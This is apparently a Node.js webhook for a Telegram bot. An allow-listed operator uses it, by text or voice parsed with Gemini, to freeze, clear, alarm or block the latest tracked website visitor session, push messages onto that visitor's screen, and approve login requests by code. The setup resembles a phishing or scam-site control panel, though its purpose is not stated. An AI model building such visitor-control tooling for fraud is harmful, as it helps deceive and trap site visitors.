// DEPLOY_TRIGGER: 2026-01-12_08:11
const admin = require("firebase-admin");
const axios = require("axios");
const { GoogleGenerativeAI } = require("@google/generative-ai");

function requireEnv(name) {
  const value = process.env[name];
  if (!value || !String(value).trim()) {
    throw new Error(`Missing required environment variable: ${name}`);
  }
  return value;
}

function getFirebasePrivateKey() {
  const raw = process.env.FIREBASE_PRIVATE_KEY;
  if (!raw) {
    throw new Error("Missing required environment variable: FIREBASE_PRIVATE_KEY");
  }
  return raw.replace(/\\n/g, "\n");
}

function getGeminiModel() {
  const apiKey = process.env.GEMINI_API_KEY;
  if (!apiKey) return null;

  const modelName = process.env.GEMINI_MODEL || "gemini-2.5-flash-lite";
  const genAI = new GoogleGenerativeAI(apiKey);
  return genAI.getGenerativeModel({ model: modelName });
}

function initFirebase() {
  if (admin.apps.length) {
    return admin.app();
  }

  return admin.initializeApp({
    credential: admin.credential.cert({
      projectId: requireEnv("FIREBASE_PROJECT_ID"),
      clientEmail: requireEnv("FIREBASE_CLIENT_EMAIL"),
      privateKey: getFirebasePrivateKey(),
    }),
  });
}

initFirebase();
const db = admin.firestore();

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const model = getGeminiModel();

async function telegram(method, payload) {
  if (!BOT_TOKEN) {
    throw new Error("Missing required environment variable: TELEGRAM_BOT_TOKEN");
  }

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  const response = await axios.post(url, payload);
  return response.data;
}

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(200).send("OK");
  }

  try {
    const callbackQuery = req.body?.callback_query;

    if (callbackQuery) {
      const data = callbackQuery.data;
      const chatId = callbackQuery.message?.chat?.id;

      if (data && data.startsWith("auth_")) {
        const parts = data.split("_");
        const reqId = parts[1];
        const code = parseInt(parts[2], 10);

        try {
          const docRef = db.collection("auth_requests").doc(reqId);
          const doc = await docRef.get();

          if (doc.exists && doc.data()?.status === "pending") {
            const expectedCode = doc.data()?.expectedCode;

            if (code === expectedCode) {
              await docRef.update({ status: "approved" });

              await telegram("answerCallbackQuery", {
                callback_query_id: callbackQuery.id,
                text: "Access Granted ✅",
              });
            } else {
              await docRef.update({
                status: "denied",
                attempts: admin.firestore.FieldValue.increment(1),
              });

              await telegram("answerCallbackQuery", {
                callback_query_id: callbackQuery.id,
                text: "Wrong Code ⛔",
              });
            }
          } else {
            await telegram("answerCallbackQuery", {
              callback_query_id: callbackQuery.id,
              text: "Expired Request ⚠️",
            });
          }
        } catch (e) {
          console.error("Auth Error:", e);

          try {
            await telegram("answerCallbackQuery", {
              callback_query_id: callbackQuery.id,
              text: "System Error ⚠️",
            });
          } catch (_) {}
        }

        return res.status(200).send("OK");
      }

      const firstUnderscore = data ? data.indexOf("_") : -1;
      if (firstUnderscore !== -1) {
        const action = data.substring(0, firstUnderscore);
        const sessionID = data.substring(firstUnderscore + 1);

        try {
          await telegram("answerCallbackQuery", {
            callback_query_id: callbackQuery.id,
            text: `Command Received: ${action.toUpperCase()}`,
          });

          await db.collection("visitors_v1").doc(sessionID).set(
            {
              action,
              action_timestamp: admin.firestore.FieldValue.serverTimestamp(),
            },
            { merge: true }
          );
        } catch (error) {
          console.error("Tracker Webhook Error:", error);
        }

        return res.status(200).send("OK");
      }
    }

    const message = req.body?.message;

    if (message && (message.voice || message.text)) {
      const allowedIdsEnv = process.env.TELEGRAM_ALLOWED_IDS || "6886010817";
      const ALLOWED_IDS = allowedIdsEnv
        .split(",")
        .map((id) => Number(id.trim()))
        .filter(Boolean);

      if (!ALLOWED_IDS.includes(message.chat.id)) {
        console.warn(`⛔ Blocked unauthorized attempt from: ${message.chat.id}`);
        return res.status(200).send("OK");
      }

      try {
        const chatId = message.chat.id;
        let inputs = [];

        if (message.voice) {
          if (!model) {
            await telegram("sendMessage", {
              chat_id: chatId,
              text: "⚠️ GEMINI_API_KEY missing. Voice command processing is disabled.",
            });
            return res.status(200).send("OK");
          }

          const fileId = message.voice.file_id;
          const fileRes = await axios.get(
            `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`
          );
          const filePath = fileRes.data?.result?.file_path;

          if (!filePath) {
            throw new Error("Telegram voice file path not found");
          }

          const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
          const audioRes = await axios.get(fileUrl, { responseType: "arraybuffer" });
          const base64Audio = Buffer.from(audioRes.data).toString("base64");

          inputs = [
            {
              inlineData: {
                data: base64Audio,
                mimeType: "audio/ogg",
              },
            },
          ];
        } else if (message.text) {
          if (!model) {
            const textUpper = String(message.text).trim().toUpperCase();
            let fallbackCommand = "UNKNOWN";
            let fallbackMessage = null;

            if (
              ["DURDUR", "KAPAT", "FREEZE", "STOP", "DON"].includes(textUpper)
            ) {
              fallbackCommand = "FREEZE";
            } else if (
              ["TEMIZLE", "AÇ", "DEVAM ET", "CLEAR", "IPTAL", "İPTAL"].includes(
                textUpper
              )
            ) {
              fallbackCommand = "CLEAR";
            } else if (textUpper === "ALARM") {
              fallbackCommand = "ALARM";
            } else if (textUpper === "ENGELLE" || textUpper === "BLOCK") {
              fallbackCommand = "BLOCK";
            }

            if (fallbackCommand === "UNKNOWN") {
              await telegram("sendMessage", {
                chat_id: chatId,
                text: `❓ Unknown command: "${message.text}"`,
              });
              return res.status(200).send("OK");
            }

            const snapshot = await db
              .collection("visitors_v1")
              .orderBy("startTime", "desc")
              .limit(1)
              .get();

            if (!snapshot.empty) {
              const sessionDoc = snapshot.docs[0];

              await sessionDoc.ref.set(
                {
                  action: fallbackCommand.toLowerCase(),
                  message: fallbackMessage,
                  action_timestamp: admin.firestore.FieldValue.serverTimestamp(),
                },
                { merge: true }
              );

              await telegram("sendMessage", {
                chat_id: chatId,
                text: `🤖 <b>Command Executed:</b> ${fallbackCommand}\n📝 ${
                  fallbackMessage || "No message"
                }`,
                parse_mode: "HTML",
              });
            } else {
              await telegram("sendMessage", {
                chat_id: chatId,
                text: "⚠️ No active sessions found to control.",
              });
            }

            return res.status(200).send("OK");
          }

          inputs = [`COMMAND TEXT: "${message.text}"`];
        }

        const prompt = `
Analyze the intent of the user's command (Audio or Text).
Return ONLY raw JSON. No markdown formatting.

Schema:
{ "command": "FREEZE" | "CLEAR" | "ALARM" | "BLOCK" | "UNKNOWN", "message": string | null }

Rules:
1. "Durdur", "Kapat", "Freeze", "Stop", "Don" -> { "command": "FREEZE", "message": null }
2. "Durdur ve [X] yaz", "Ekrana [X] yaz", "Mesaj: [X]" -> { "command": "FREEZE", "message": "[X]" }
3. "Temizle", "Aç", "Devam et", "Clear", "İptal" -> { "command": "CLEAR", "message": null }
4. "Alarm" -> ALARM, "Engelle" -> BLOCK
5. If unknown -> UNKNOWN
        `.trim();

        const result = await model.generateContent([prompt, ...inputs]);
        const responseText = result.response
          .text()
          .replace(/```json|```/g, "")
          .trim();

        let responseData;
        try {
          responseData = JSON.parse(responseText);
        } catch {
          throw new Error(`Invalid JSON returned from Gemini: ${responseText}`);
        }

        const command = String(responseData.command || "UNKNOWN").toUpperCase();
        const messageContent = responseData.message || null;

        if (["FREEZE", "CLEAR", "ALARM", "BLOCK"].includes(command)) {
          const snapshot = await db
            .collection("visitors_v1")
            .orderBy("startTime", "desc")
            .limit(1)
            .get();

          if (!snapshot.empty) {
            const sessionDoc = snapshot.docs[0];

            await sessionDoc.ref.set(
              {
                action: command.toLowerCase(),
                message: messageContent,
                action_timestamp: admin.firestore.FieldValue.serverTimestamp(),
              },
              { merge: true }
            );

            await telegram("sendMessage", {
              chat_id: chatId,
              text: `🤖 <b>Command Executed:</b> ${command}\n📝 ${
                messageContent || "No message"
              }`,
              parse_mode: "HTML",
            });
          } else {
            await telegram("sendMessage", {
              chat_id: chatId,
              text: "⚠️ No active sessions found to control.",
            });
          }
        } else {
          if (message.text) {
            await telegram("sendMessage", {
              chat_id: chatId,
              text: `❓ Unknown command: "${message.text}"`,
            });
          }
        }
      } catch (error) {
        console.error("Handler Error:", error);

        try {
          await telegram("sendMessage", {
            chat_id: message.chat.id,
            text: `⚠️ System Error: ${error.message}`,
          });
        } catch (_) {}
      }
    }

    return res.status(200).send("OK");
  } catch (error) {
    console.error("Webhook Fatal Error:", error);
    return res.status(200).send("OK");
  }
};
